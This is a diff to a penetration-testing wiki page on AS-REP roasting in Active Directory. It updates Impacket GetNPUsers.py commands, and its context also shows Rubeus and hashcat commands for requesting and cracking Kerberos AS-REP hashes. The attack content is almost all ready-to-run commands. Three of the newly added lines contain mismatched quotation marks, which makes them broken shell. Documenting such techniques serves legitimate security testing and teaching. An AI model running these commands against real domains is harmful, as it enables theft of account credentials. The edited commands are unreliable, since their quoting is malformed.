@@ -28,16 +28,16 @@ The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetNPUsers](h
 
 ```bash
 # users list dynamically queried with an LDAP anonymous bind
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN/"
 
 # with a users file
-GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
+GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP "$DOMAIN/"
 
 # users list dynamically queried with a LDAP authenticated bind (password)
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP "$DOMAIN/$USER:$PASSWORD"
 
 # users list dynamically queried with a LDAP authenticated bind (NT hash)
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes ":$NT_HASH" -dc-ip "$DC_IP "$DOMAIN/$USER"
 ```
 
 This can also be achieved with [NetExec](https://github.com/Pennyw0rth/NetExec) (Python).
@@ -62,7 +62,7 @@ Rubeus.exe asreproast  /format:hashcat /outfile:ASREProastables.txt
 
 
 
-Depending on the output format used (`hashcat` or `john`), [hashcat](https://github.com/hashcat/hashcat) and [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper) can be used to try [cracking the hashes](../credentials/cracking.md).
+Depending on the output format used (`hashcat` or `john`), [hashcat](https://github.com/hashcat/hashcat) and [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper) can be used to try [cracking the hashes](../../credentials/cracking.md).
 
 ```bash
 hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
